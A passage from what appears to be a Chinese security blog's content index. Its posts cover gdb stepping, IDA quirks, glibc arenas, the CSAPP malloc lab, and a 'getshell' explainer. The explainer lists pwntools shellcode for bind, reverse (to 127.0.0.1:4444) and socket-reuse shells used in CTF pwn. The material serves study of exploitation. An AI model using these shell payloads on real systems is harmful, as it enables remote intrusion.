3</code>，引发中断后执行系统调用<code>ptrace</code>，那么同样是插入指令，为什么这两种指令会有不同影响？</p>\n<h3><span id=\"gdb指令级单步的实现\">gdb指令级单步的实现</span></h3><p>首先还是复习一下老生常谈（的软硬断点问题。</p>\n<p>硬件单步指cpu架构（如x86、ppc）本身支持指令级单步，目标程序可以在运行一条指令后自动停止。x86是通过设置EFLAGAS寄存器中的TF标志将cpu置于单步模式。cpu每执行一条指令，就会产生一个单步异常，通知gdb处理。</p>\n<h3><span id=\"nextampstep命令\">next&amp;step命令</span></h3><p>即n指令。</p>\n<p>执行next命令时，gdb会计算出当前停止位置的c语句的第一条指令的地址作为<code>step_range_start</code>,下一行的c语句的第一条指令地址作为<code>step_range_end</code>。next命令的结束条件为</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\">pc&lt; step_range_start || pc &gt;= step_range_end</span><br></pre></td></tr></table></figure>\n<p>这里可以简单地理解为当pc离开当前执行的代码就算一次next指令的完成。</p>\n<p>那么next指令是如何跳过函数调用的呢？</p>\n<p>事实上是当gdb发现子函数第一条指令为函数调用后，就立即在函数返回地址插入一个临时断点，并一直运行到该断点处。</p>\n<p>step指令与next都是c源码级别的单步，只不过并不会跳过函数调用。</p>\n<h3><span id=\"next-iampstepi指令\">next i&amp;stepi指令</span></h3><p>加上“i”后，gdb实现指令级单步。</p>\n<h3><span id=\"回答\">回答</span></h3><p>基于我个人的理解，可以将si认为是单步的最小单位，而不同的指令只是不同函数功能的体现罢了。</p>\n<p>这样回答似乎很弱智，真的很弱智？</p>\n<h3><span id=\"真的有这么简单吗\">真的有这么简单吗？？？</span></h3><p>来看<code>breakpoint.c</code>（ps：gdb的源码我感觉有一点点乱，这个文件不在子文件夹中）</p>\n<p>代码还是蛮长的，有一万五千多行，光是找到函数就已经是个体力活了。</p>\n<p>还没写完，鸽一下，去看llvm了，最近高强度学习新知识ing。</p>\n<h2><span id=\"参考\">参考</span></h2><p><a href=\"https://www.cnblogs.com/tsecer/category/1413042.html\">https://www.cnblogs.com/tsecer/category/1413042.html</a></p>\n<p><a href=\"https://blog.csdn.net/xuchenhuics/article/details/79680435\">https://blog.csdn.net/xuchenhuics/article/details/79680435</a></p>\n<p><a href=\"https://www.docin.com/p-18618736.html\">https://www.docin.com/p-18618736.html</a></p>\n<p><a href=\"https://cloud.tencent.com/developer/article/1823077\">https://cloud.tencent.com/developer/article/1823077</a></p>\n","categories":["Binary_security"],"tags":["GDB"]},{"title":"getshell是什么？","url":"/2022/10/18/mess_getshell%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script>\n    <div id=\"aplayer-PNKeCcUC\" class=\"aplayer aplayer-tag-marker meting-tag-marker\" data-id=\"1844479015\" data-server=\"netease\" data-type=\"song\" data-mode=\"circulation\" data-autoplay=\"false\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#555\"></div>  \n<h1><span id=\"0-前言\">0 前言</span></h1><p>​        研究2018-1160的时候，看到一篇文章中的一句话，让我费解到了现在：</p>\n<p><a href=\"https://ddaa.tw/hitconctf_pwn_371_netatalk.html\">HITCON CTF 2019 Pwn 371 Netatalk</a></p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-10-24%20%E4%B8%8A%E5%8D%8811.23.38.png\" alt=\"截屏2022-10-24 上午11.23.38\"></p>\n<p>非常不幸的是，最近在研究2016-10191的时候也遇到了同样的问题——onegadget无法getshell，以上种种让我对getshell这个看似简单的概念产生了巨大的疑惑，遂有了这一篇文章—getshell到底是什么？</p>\n<h2><span id=\"问题解答\">问题解答？</span></h2><p>​        首先讲我对于“自行dup i/o”的理解，可能有不对的地方。一般情况下，我们利用pwbntools封装的socket接口与远程程序进行交互，我们的io都已经被pwntools重定向到了socket上，所以我们如果希望程序执行<code>system(&quot;/bin/sh&quot;)</code>的话就只需要发送过去就好了。那么当程序执行这条语句的时候，就会生成一个本地的shell，再由pwntools发送过来以完成“交互”。但是如果程序本身就是由socket进行交互的话，我们希望程序执行<code>system(&quot;/bin/sh&quot;)</code>，那么好的情况它也只是会在本地执行<code>sh</code>,而这个弹出的shell并不能进行交互，因为没有渠道供我们与这个“shell”交互。所以解决方式就是利用shellcode或rop链反弹shell。</p>\n<h2><span id=\"ctf-getshell\">ctf getshell</span></h2><p>​        首先从简单的ctf pwn开始。</p>\n<p>​        平时我们getshell的思路——控制程序执行流，rip劫持为提权函数。比如说覆盖某个函数指针为<code>system(&quot;/bin/sh&quot;)</code>，一般的流程是这样：本地打通后，连接远程环境，一般情况下也能拿到远程机器的shell。</p>\n<p>​        但是我们究竟是怎么与远端程序进行通信的？</p>\n<p>​        我们通常使用pwntool的<code>tubes</code>模块，比如</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">p = remote(<span class=\"string\">&quot;ip&quot;</span>,port)</span><br></pre></td></tr></table></figure>\n<p>​        这个函数其实非常好理解，但是实际上实现的功能并不简单。</p>\n<p>​        看一看pwntools的官方文档的解释：</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-10-24%20%E4%B8%8A%E5%8D%8811.20.27.png\" alt=\"截屏2022-10-24 上午11.20.27\"></p>\n<p>创造一个远程主机的TCVP/UDP 链接。熟悉socket编程的话就能很快反应过来，其实就是pwntool为我们创建了一个socket供本机与远程进行连接。</p>\n<p><code>process()</code>的功能也可以用同样的方式去理解。</p>\n<h2><span id=\"实战\">实战</span></h2><p>如果程序通信是通过socket，那么我们无法通过简单的<code>one_gadget</code>或者什么弹shell，就需要用到一些方法。这里copy一下轩神的笔记：</p>\n<p><a href=\"https://xuanxuanblingbling.github.io/ctf/pwn/2020/12/13/getshell3/\">Getshell远程：真·RCE 正连？反连？不连？</a></p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">context(arch=<span class=\"string\">&#x27;amd64&#x27;</span>,os=<span class=\"string\">&#x27;linux&#x27;</span>)</span><br><span class=\"line\">io = remote(<span class=\"string\">&quot;127.0.0.1&quot;</span>,<span class=\"number\">8888</span>)</span><br><span class=\"line\">shellcode1 = asm(shellcraft.sh())<span class=\"comment\">#无交互式shell</span></span><br><span class=\"line\">shellcode2 = asm(shellcraft.amd64.linux.bindsh(<span class=\"number\">4444</span>))<span class=\"comment\">#正连</span></span><br><span class=\"line\">shellcode3 = asm(shellcraft.connect(<span class=\"string\">&#x27;127.0.0.1&#x27;</span>,<span class=\"number\">4444</span>)+shellcraft.dupsh())<span class=\"comment\">#反连</span></span><br><span class=\"line\">shellcode4 = asm(shellcraft.dupsh(<span class=\"number\">4</span>))<span class=\"comment\">#不连</span></span><br><span class=\"line\">shellcode5 = asm(shellcraft.findpeersh(io.lport))<span class=\"comment\">#不连</span></span><br></pre></td></tr></table></figure>\n<p>以上几种就是常见的弹shell思路，在cve-2016-10190和10191就是两个很好的例子，他们都是使用socket进行通信，并且都是可以利用反连到<code>&#39;127.0.0.1&#39;</code>+<code>port</code>的shellcode来弹shell。</p>\n","categories":["Binary_security"],"tags":["mess"]},{"title":"hexo调教合集","url":"/2022/03/26/mess_hexo%E8%B0%83%E6%95%99%E5%90%88%E9%9B%86/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script>\n    <div id=\"aplayer-KIPNePSM\" class=\"aplayer aplayer-tag-marker meting-tag-marker\" data-id=\"1844479015\" data-server=\"netease\" data-type=\"song\" data-mode=\"circulation\" data-autoplay=\"false\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#555\"></div>  \n<p>​        如何实现一个好看且满足我所有需求的blog？</p>\n<h4><span id=\"高亮\">高亮</span></h4><p>​    之前我以为是博客主题配置的问题（就是highlight对象的值的问题），但是无论用怎么样的方法都不太行。</p>\n<p>​    在研究代码高亮的过程中，我才知道原来有个项目叫highlight.js,里面有各种各样的代码高亮的css文件。</p>\n<p>​    一开始我是将博客原本的代码高亮的css文件替换成我想要的样式，但是无论替换成什么样式，博客中代码都是蓝色，清一色的蓝色。然后我意识到，这根本不是什么代码高亮的样式，这根本就是，没有代码高亮。</p>\n<p>​    然后我开始在网上寻找解决方案，搜索的关键词是hexo 无法显示代码高亮，辗转来回，找到了一篇文章。</p>\n<p>​    <a href=\"https://igeek.cloud/2021/01/13/hexo中highlight-js代码高亮的修改方法/\">hexo中highlight.js代码高亮的修改方法</a></p>\n<p>​    按照文章中的方法，我在主题layout文件夹中的_post.ejs文件随便找了个角落，把</p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\">COPY<span class=\"comment\">&lt;!-- Highlight.js --&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">link</span> <span class=\"attr\">rel</span>=<span class=\"string\">&quot;stylesheet&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">        <span class=\"attr\">href</span>=<span class=\"string\">&quot;//highlightjs.org/static/demo/styles/night-owl.css&quot;</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">src</span>=<span class=\"string\">&quot;//cdnjs.cloudflare.com/ajax/libs/highlight.js/10.5.0/highlight.min.js&quot;</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\">    hljs.initHighlightingOnLoad();</span><br><span class=\"line\">&lt;/script</span><br></pre></td></tr></table></figure>\n<p>丢了进去。</p>\n<p>​    然后我的博客就成功的显示了代码高亮。</p>\n<p>​    高亮的样式可以通过更改<code>sytels/xx</code>来实现，具体的样式可以从Highlight.js官网找到。</p>\n<h4><span id=\"音乐播放器\">音乐播放器</span></h4><p>​        步骤其实比较简单。</p>\n<h5><span id=\"1安装插件\">1:安装插件</span></h5><p>​        ```</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">npm install --save hexo-tag-aplayer</span><br></pre></td></tr></table></figure>\n<h5><span id=\"2更改配置\">2:更改配置</span></h5><p>​        在hexo主题的config文件中增加</p>\n<figure class=\"highlight yml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">aplayer:</span></span><br><span class=\"line\">  <span class=\"attr\">meting:</span> <span class=\"literal\">true</span></span><br></pre></td></tr></table></figure>\n<h5><span id=\"3在正文中添加tag\">3:在正文中添加tag</span></h5><p>例子</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-26%20%E4%B8%8B%E5%8D%889.47.51.png\" alt=\"截屏2022-03-26 下午9.47.51\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#123;% meting &quot;7342554262&quot; &quot;netease&quot; &quot;playlist&quot; &quot;theme:#555&quot; &quot;mutex:true&quot; &quot;listmaxheight:340px&quot; &quot;preload:auto&quot; %&#125; </span><br></pre></td></tr></table></figure>\n<div class=\"table-container\">\n<table>\n<thead>\n<tr>\n<th style=\"text-align:left\">选项</th>\n<th>默认值</th>\n<th>描述</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:left\">id</td>\n<td><strong>必须值</strong></td>\n<td>歌曲 id / 播放列表 id / 相册 id / 搜索关键字</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">server</td>\n<td><strong>必须值</strong></td>\n<td>音乐平台: <code>netease</code>, <code>tencent</code>, <code>kugou</code>, <code>xiami</code>, <code>baidu</code></td>\n</tr>\n<tr>\n<td style=\"text-align:left\">type</td>\n<td><strong>必须值</strong></td>\n<td><code>song</code>, <code>playlist</code>, <code>album</code>, <code>search</code>, <code>artist</code></td>\n</tr>\n<tr>\n<td style=\"text-align:left\">fixed</td>\n<td><code>false</code></td>\n<td>开启固定模式</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">mini</td>\n<td><code>false</code></td>\n<td>开启迷你模式</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">loop</td>\n<td><code>all</code></td>\n<td>列表循环模式：<code>all</code>, <code>one</code>,<code>none</code></td>\n</tr>\n<tr>\n<td style=\"text-align:left\">order</td>\n<td><code>list</code></td>\n<td>列表播放模式： <code>list</code>, <code>random</code></td>\n</tr>\n<tr>\n<td style=\"text-align:left\">volume</td>\n<td>0.7</td>\n<td>播放器音量</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">lrctype</td>\n<td>0</td>\n<td>歌词格式类型</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">listfolded</td>\n<td><code>false</code></td>\n<td>指定音乐播放列表是否折叠</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">storagename</td>\n<td><code>metingjs</code></td>\n<td>LocalStorage 中存储播放器设定的键名</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">autoplay</td>\n<td><code>true</code></td>\n<td>自动播放，移动端浏览器暂时不支持此功能</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">mutex</td>\n<td><code>true</code></td>\n<td>该选项开启时，如果同页面有其他 aplayer 播放，该播放器会暂停</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">listmaxheight</td>\n<td><code>340px</code></td>\n<td>播放列表的最大长度</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">preload</td>\n<td><code>auto</code></td>\n<td>音乐文件预载入模式，可选项： <code>none</code>, <code>metadata</code>, <code>auto</code></td>\n</tr>\n<tr>\n<td style=\"text-align:left\">theme</td>\n<td><code>#ad7a86</code></td>\n<td>播放器风格色彩设置</td>\n</tr>\n</tbody>\n</table>\n</div>\n<h4><span id=\"一些报错\">一些报错</span></h4>","categories":["Binary_security"],"tags":["mess"]},{"title":"positive sp value has been found","url":"/2021/12/10/mess_ida%207.0%20for%20mac%E7%96%91%E9%9A%BE%E6%9D%82%E7%97%87%EF%BC%9A%20positive%20sp%20value%20has%20been%20found/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script>\n    <div id=\"aplayer-UUghMjfJ\" class=\"aplayer aplayer-tag-marker meting-tag-marker\" data-id=\"7342554262\" data-server=\"netease\" data-type=\"playlist\" data-mode=\"circulation\" data-autoplay=\"false\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#555\"></div> \n<h3><span id=\"0\">0）</span></h3><p>​        自从抛弃虚拟机，利用ida for mac+pwndocker实现完全mac环境以后，深觉优雅的同时，也遇见了不少坑。</p>\n<p>​        其中ida的坑更是坑人于无形之中。因为如果不打开win的7.5（甚至7.6）做对比，你甚至不知道你遇见的一些奇怪的东西，是7.0 mac版特有的，已经被优化了的坑，还是自身逆向水平问题。</p>\n<p>​        作为一个逆向废物，7.0 for mac属实是给本来就逆不出的我雪上加霜，但是就算是这样，我也宁愿花时间解决问题，而不是重新回到虚拟机win的悲惨过往，因为这不优雅。（优雅这个词到底害死了多少人捏）</p>\n<h3><span id=\"1\">1）</span></h3><p>​        目前碰到的最多的一个问题，就是：</p>\n<p>​        <img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-12-10%20%E4%B8%8B%E5%8D%884.13.01.png\" alt=\"截屏2021-12-10 下午4.13.01\"></p>\n<p>​        其实这个严格来讲算不上问题，因为你只需要找到main函数再f5，照样能够反编译，但是每次弹出的这个框就让我很恼火。所以解决问题的目标在于修改ida使得不再弹出这个框，而不是修改程序治标不治本捏。</p>\n<p>​        对于问题本身，其实还是比较常规，只需要patch一下就好了。</p>\n<p>​        我这里是<code>_start()</code>堆栈不平衡，</p>\n<p>​                <img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-12-10%20%E4%B8%8B%E5%8D%884.22.48.png\" alt=\"截屏2021-12-10 下午4.22.48\"></p>\n<p>​        问题显然出在<code>and     rsp, 0FFFFFFFFFFFFFFF0h</code>到<code>start</code>结束的这一大段。call完main以后居然没有retn。<img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-12-10%20%E4%B8%8B%E5%8D%884.27.29.png\" alt=\"截屏2021-12-10 下午4.27.29\"></p>\n<p>​        首先报堆栈不平衡的错误大概就是因为ida要求stack pointer在函数开头和结束时相等。然后导致堆栈不平衡，通常是因为程序本身含有代码混淆/花指令，但是这是一道pwn题，为什么要在这种地方为难人。</p>\n<p>​        我超，流汗黄豆原来是为难的意思。</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-12-10%20%E4%B8%8B%E5%8D%885.07.12.png\" alt=\"截屏2021-12-10 下午5.07.12\"></p>\n<p>​        </p>\n<p>​        首先最让我疑惑的就是末尾的hlt指令，它取代了retn，然后它的意思是暂停指令，而不是返回。为什么这个地方会有一条这样的指令，是程序原本设计的还是ida反编译的问题？</p>\n<p>​        稍微学习了一下，意识到start函数是被拆成了三个部分，所以只反编译一个部分肯定有问题。</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-12-10%20%E4%B8%8B%E5%8D%885.17.51.png\" alt=\"截屏2021-12-10 下午5.17.51\"></p>\n<p>​        但是虽然这样堆栈平衡，但是还是无法反编译，我也不清楚里面是不是有什么花指令。</p>\n<p>​        和胖爷爷交流了一下，7.5及以上也会出现这个错误，但是完全可以反编译，并且start就是只有那么一段，没有后面的一堆东西。我不理解，我也修复不了，这篇文章毫无意义，但是学习了一些修复堆栈不平衡的方法（</p>\n<h3><span id=\"参考\">）参考</span></h3><p>​        <a href=\"https://blog.csdn.net/lixiangminghate/article/details/78820388\">IDA出现”sp-analysis failed”和F5(反编译)失败</a></p>\n<p>​</p>\n","categories":["Binary_security"],"tags":["reverse"]},{"title":"ida的结构体识别","url":"/2022/03/17/mess_ida%E7%9A%84%E7%BB%93%E6%9E%84%E4%BD%93%E8%AF%86%E5%88%AB/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script>\n    <div id=\"aplayer-UDqgXfKK\" class=\"aplayer aplayer-tag-marker meting-tag-marker\" data-id=\"7342554262\" data-server=\"netease\" data-type=\"playlist\" data-mode=\"circulation\" data-autoplay=\"false\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#555\"></div> \n<h4><span id=\"0\">0</span></h4><p>​        最近发现做堆题最慢的不是调试，而是在逆向的过程中寻找思路，而一般堆题的菜单都是由结构体管理，所以如果能在ida中快速方便地查看结构体相关的指针操作就再好不过了。然而一般来说ida是无法直接识别结构体这种比较高级的数据结构的，所以需要我们手动去创建并修改。</p>\n<h4><span id=\"1\">1</span></h4><p>​        首先可以在ida<code>structures</code>的界面手动添加一些结构体<img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-17%20%E4%B8%8B%E5%8D%888.35.57.png\" alt=\"截屏2022-03-17 下午8.35.57\"></p>\n<p>​        右键空白处，选择<code>add struct type</code>，便可以新建结构体。鼠标选中ends字段，按下D可以新建字段，在当前字段再按下D可以调整字段长度。</p>\n<p>​        </p>\n<h5><span id=\"为反汇编代码添加结构体\">为反汇编代码添加结构体</span></h5><p>​        <img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-18%20%E4%B8%8A%E5%8D%8811.28.06.png\" alt=\"截屏2022-03-18 上午11.28.06\"></p>\n<p>​        </p>\n<p>​        随便一道堆题，逻辑比较简单，几个对于字段的处理都比较直观，所以可以较为清楚地知道head结构体中的字段，然后右键head创建结构体，        <img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-18%20%E4%B8%8A%E5%8D%8811.32.26.png\" alt=\"截屏2022-03-18 上午11.32.26\"></p>\n<p>然后按照实际情况调整。</p>\n","categories":["Binary_security"],"tags":["mess"]},{"title":"main_arana 与多线程","url":"/2021/08/18/mess_main_arana%20%E4%B8%8E%E5%A4%9A%E7%BA%BF%E7%A8%8B/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script>\n    <div id=\"aplayer-KhtbEUJE\" class=\"aplayer aplayer-tag-marker meting-tag-marker\" data-id=\"7342554262\" data-server=\"netease\" data-type=\"playlist\" data-mode=\"circulation\" data-autoplay=\"false\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#555\"></div> \n<h3><span id=\"在学习tcache的时候遇到了一些比较奇怪的点ctf权威指南pwn篇中对于tcache的解释中第一段如下\">在学习Tcache的时候遇到了一些比较奇怪的点，ctf权威指南pwn篇中对于Tcache的解释中第一段如下：</span></h3><blockquote>\n<p>Tcache全名为Thread Local Caching，它为每个线程创建一个缓存，里面包含了一些小堆块，无需对main_arena上锁即可使用。</p>\n</blockquote>\n<p>首先让我感到不解的就是，“无需对main_arena上锁即可使用”这句话。什么叫对main_arana上锁？之前也遇见过很多文章提到过这个”锁“的相关概念，但是它们从来都不是问题的重点，但是通常来说，正是一个个不懂的”无关紧要“的问题导致最后啥也看不懂的。</p>\n<p>所以在这篇文章中我们有必要从ctf pwn的角度去理解线程 main_arena。</p>\n<h4><span id=\"加锁\">加锁</span></h4><p>当<strong>多个线程同时操作同一个共享全局变量</strong>的时候，对线程上锁，保证同一时间一个对象只有一个线程在访问，可以解决资源占用问题，同时保证了数据的安全性。</p>\n<h4><span id=\"线程\">线程</span></h4><p>线程一般来说被进程包含：一个进程可以有很多线程来处理，每条线程并行执行不同的任务。</p>\n<p>比如说ptmalloc2这个是个进程，然后其中包含很多很多线程。</p>\n<p>其中会有一个<code>main_arena</code>,是整个ptmalloc2进程中的主线程，然后main_arena会有很多子线程，每个子线程包含很多连续的内存片段，被称为heap。每一个heap都有自己的heap_header，它们通过链表互相连接，且其中保存了指向其所属arena的指针。</p>\n<p>这么讲似乎有一些太过抽象。具体一点讲就是，在只有一个main_arena的时候，ptmalloc只能通过mmap和sbrk申请堆内存。</p>\n<blockquote>\n<p>在多线程的情况下，显然让所有的线程公用一个数据结构来获取内存块会造成十分惨烈的对锁的竞争，所以 ptmalloc 中间多了一层组织结构——arena。每个arena包含一些可用的内存区块，用一个 arena 级别的锁来控制访问。当线程比较少的时候，每个可以拥有自己的arena，而当 arena 数目超过允许最大值时，多个线程共享一个 arena 了。个线程第一次 malloc 的时候都会 attach 一个 arena 。除非这个 arena 被标记为破坏的（ARENA_CORRUPTION_BIT），否则该线程以后再 malloc 都会继续用这个 arena。</p>\n</blockquote>\n<p>之前ctf权威指南中有讲到，每一个子线程包含很多连续的内存片段，被称为heap。它们都有自己所属的arena。这句话很容易让人觉得——每一个子线程有且只有一个arena，但是还存在多对一的情况。</p>\n<p>但是对于ctf pwn来说，实际情况远远没有这么复杂，基本我们操作的所谓的堆，chunk这些概念，考点基本都是建立在单线程的情况下的，它们的arena也都是<code>main_arena</code>而并不是什么<code>non_main_arena</code>。并且只有<code>main_arena</code>能够访问<code>heap</code>段，<code>non_main_arena</code>只能访问<code>mmap</code>映射区域。</p>\n<h3><span id=\"总结\">总结</span></h3><p>用比较简单的话来说，main_arena就是主线程中一个管理所有链表的关键的数据结构，我们可以通过它获得各个bins的偏移。以及利用指向它的fd来做一些不好的事情（）。承接之前的内容，我们在利用main_arena的同时也需要对其进行上锁，防止别的线程与它共用一个资源，然后之前Tcahce里的“无需对main_arena上锁”意思也很清楚了，因为考虑到效率。所以抛弃了一定的安全性。</p>\n<h2><span id=\"参考\">参考</span></h2><p><a href=\"https://zhuanlan.zhihu.com/p/24909781\">malloc x 线程</a></p>\n<p><a href=\"https://www.wangan.com/docs/1741\">GLibcHeap</a></p>\n","categories":["Binary_security"],"tags":["mess"]},{"title":"csapp malloc lab","url":"/2021/12/03/mess_malloc_lab/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script>\n    <div id=\"aplayer-UwyrjdTM\" class=\"aplayer aplayer-tag-marker meting-tag-marker\" data-id=\"7342554262\" data-server=\"netease\" data-type=\"playlist\" data-mode=\"circulation\" data-autoplay=\"false\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#555\"></div> \n<h2><span id=\"0前言\">0）前言</span></h2><p>​        鸽了三个月的malloc lab，作为复习堆题的开始。</p>\n<p>​        计画完成时间是12.5之前，也就是三天。</p>\n<h2><span id=\"1大体设计\">1）大体设计</span></h2><p>​        对于整体的操作的大致模型以及allocater和freer需要做的工作如下：</p>\n<p>​        分配器：</p>\n<ol>\n<li><p>在第一次分配chunk时，对堆空间进行初始化=&gt;<code>mm_init()</code>    </p>\n</li>\n<li><p>创建指定类型的chunk。</p>\n<p>​    free</p>\n</li>\n<li><p>利用隐式空闲链表，将free状态的chunk链接。</p>\n</li>\n<li>利用合适的机制，对物理地址相邻的free chunk进行合并</li>\n<li>利用合适的机制，在分配器有需求的时候分割相对应的free chunk，并将其标识为allocated。</li>\n</ol>\n<p>​        其他的驱动代码以及头文件已经给出，我们只需在<code>mm.c</code>中进行编写。</p>\n<p>​        在这个模型中，分配器的分配的chunk的结构大致如下，运用带边界标记的chunk使堆块合并更加优雅。</p>\n<p>​                <img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-12-03%20%E4%B8%8B%E5%8D%885.33.23.png\" alt=\"截屏2021-12-03 下午5.33.23\"></p>\n<p>​        </p>\n<h2><span id=\"2利用宏定义简化指针操作\">2）利用宏定义简化指针操作</span></h2><p>​        为了简化在操作chunk在链表中的一些与指针相关的行为，我们可以定义一系列宏来将这些操作打包，使得代码更为简洁，同时一些基本的常数也将被定义。</p>\n<p>​    </p>\n<p>​        <img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-12-04%20%E4%B8%8B%E5%8D%885.05.59.png\" alt=\"截屏2021-12-04 下午5.05.59\"></p>\n<p>​            </p>\n<h2><span id=\"3level1\">3）level·1</span></h2><p>​        level1利用隐式空闲链表+首次/下一次/最佳适配三种方式实现。</p>\n<h3><span id=\"first_fit\">first_fit</span></h3><h4><span id=\"mm_init\">mm_init()</span></h4><p>​        首先是<code>mm_init()</code>函数，利用<code>mm_sbrk()</code>创建一个4字的空闲链表，将链表第一个双字的首尾分别标记为序言块的header和footer，然后将第三个字标记为结尾块，然后调用<code>extend_heap()</code>函数初始化堆空间。被初始化的size为<code>CHUNKSIZE/WSIZE</code>也就是<code>1*10^12 / 4</code>。</p>\n<p>​        然后是<code>extend_heap()</code>函数，利用<code>mm_sbrk()</code>创建size大小的空间，size由之前初始化的size决定。并且将整个空chunk的对应位标记头和脚部。最后，在很可能出现的前一个堆以一个空闲块结束的情况，我们调用coalesce函数来合并两个空闲块 ，并返回指向合并后的块的块指针。coalesce函数将在后面的部分被详细分析。</p>\n<h4><span id=\"mm_malloc\">mm_malloc()</span></h4><p>​        堆空间初始化之后，我们首先设计<code>mm_malloc()</code>。</p>\n<p>​        函数大致功能是：</p>\n<ol>\n<li><p>检查请求真假，然后准备分配chunk</p>\n</li>\n<li><p>调整chunk size，在请求size的基础上加入8字节的对齐和8字节的chunk头和chunk脚。也就是说，一个chunk至少会有16字节。</p>\n</li>\n<li><p>在free list中寻找符合size要求的chunk。</p>\n</li>\n<li><p>如果没有在free list中找到，则直接调用<code>extend_heap()</code>生成对应的空间。</p>\n<p>​    </p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-12-04%20%E4%B8%8B%E5%8D%887.21.02.png\" alt=\"截屏2021-12-04 下午7.21.02\">    </p>\n</li>\n</ol>\n<p>   这里csapp没有为我们提供<code>find_fit()</code>以及<code>place()</code>的例子,需要我们自己编写。我们先放着，之后再来讨论。</p>\n<h4><span id=\"mm_free\">mm_free()</span></h4><p>​        <code>mm_malloc()</code>之后，我们来看<code>mm_free()</code></p>\n<p>​        它被用来释放已被分配的chunk，相当于释放malloc所请求的bp，然后需要将被释放的chunk与其物理领接的free chunk合并。</p>\n<p>​        